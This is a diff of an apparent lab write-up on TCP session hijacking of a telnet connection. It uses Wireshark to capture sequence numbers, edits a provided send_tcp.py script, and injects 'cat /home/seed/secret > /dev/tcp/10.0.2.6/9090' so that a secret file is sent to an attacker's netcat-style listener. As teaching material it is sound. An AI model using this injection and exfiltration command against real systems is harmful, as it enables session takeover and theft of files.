@@ -27,16 +27,16 @@ In this lab, we will hijack a telnet session (between the victim client and the 
 3. the client uses the *cat* command to confirm the file now exists and is located at /home/seed/secret:
 ![alt text](lab-tcp-hijack-cat.png "Lab tcp session hijacking cat")
 
-3. let the attacker start monitoring network traffic using wireshark.
+4. let the attacker start monitoring network traffic using wireshark.
 
 ![alt text](lab-tcp-hijack-start-wireshark.png "Lab tcp hijack start wireshark")
 ![alt text](lab-tcp-hijack-start-capture.png "Lab tcp hijack start capture")
 
-4. client produces some telnet packets. (any telnet packets, you can just type a command like *ls*).
+5. client produces some telnet packets. (any telnet packets, you can just type a command like *ls*).
 
 ![alt text](lab-tcp-hijack-ls.png "Lab tcp hijack ls command")
 
-5. attacker stops wireshark capturing, and navigates to the latest packet sent from the client to the server.
+6. attacker stops wireshark capturing, and navigates to the latest packet sent from the client to the server.
 
 This image shows the ip addresses, and the ttl attribute.
 ![alt text](lab-tcp-hijack-capture1.png "Lab tcp hijack latest tcp capture - part 1")
@@ -44,7 +44,7 @@ This image shows the ip addresses, and the ttl attribute.
 This image shows the port numbers, the next sequence number, the acknowledgment number, and the window size - still the same packet.
 ![alt text](lab-tcp-hijack-capture2.png "Lab tcp hijack latest tcp capture - part 2")
 
-6. the above packet provides the information which the attacker needs to know in order to perform the tcp reset attack. now, the attacker, mimicking the client, only needs to send one single regular TCP packet to the server. To send a regular TCP packet, a python script named send_tcp.py is provided. When running this script, it will send a TCP packet to a destination. You need to change the script so that the following 9 lines match with your situation.
+7. the above packet provides the information which the attacker needs to know in order to perform the tcp reset attack. now, the attacker, mimicking the client, only needs to send one single regular TCP packet to the server. To send a regular TCP packet, a python script named send_tcp.py is provided. When running this script, it will send a TCP packet to a destination. You need to change the script so that the following 9 lines match with your situation.
 
 ```console
 source_ip = "10.0.2.4"
@@ -64,14 +64,17 @@ tcp_payload = "\rcat /home/seed/secret > /dev/tcp/10.0.2.6/9090\r"
 
 **Explanation 2**: why the telnet command we want to inject is "cat /home/seed/secret > /dev/tcp/attacker_ip/9090". Because "cat /home/seed/secret" shows the content of the secret file, but this command will only display the content in the victim client's terminal window, not in the attacker's terminal window. This "cat /home/seed/secret > /dev/tcp/attacker_ip/9090" will redirect the output of the cat command into a tcp port 9090 at the attacker's ip address. Thus we come to our next step,
 
-7. before pressing enter, the attacker needs to open another terminal window so that the attacker can listen on a port at the attacker's IP address - we will choose port 9090.
+8. before running the script, the attacker needs to open another terminal window so that the attacker can listen on a port at the attacker's IP address - here we choose port 9090, which matches with what is specified in the python script.
 
+8.1. Listening in one terminal window:
 ![alt text](lab-tcp-hijack-listening.png "Lab tcp hijacking attack listening on port 9090")
 
-- after pressing enter:
-![alt text](lab-tcp-hijack-after-enter.png "Lab tcp hijacking attack after enter command")
+8.2. Run python script in another terminal window:
+- before and after pressing enter to run the script:
+![alt text](lab-tcp-hijack-after-enter.png "Lab tcp hijacking attack before pressing enter")
+![alt text](lab-tcp-hijack-after-enter.png "Lab tcp hijacking attack after pressing enter")
 
-7. once the attacker pressed enter to execute the above script, if the attack is successful, the victim server's secret file will be displayed in the attacker's terminal window:
+9. once the attacker pressed enter to execute the above script, if the attack is successful, the victim server's secret file will be displayed in the attacker's terminal window:
 
 ![alt text](lab-tcp-hijack-success.png "Lab tcp session hijacking attack successful")
 
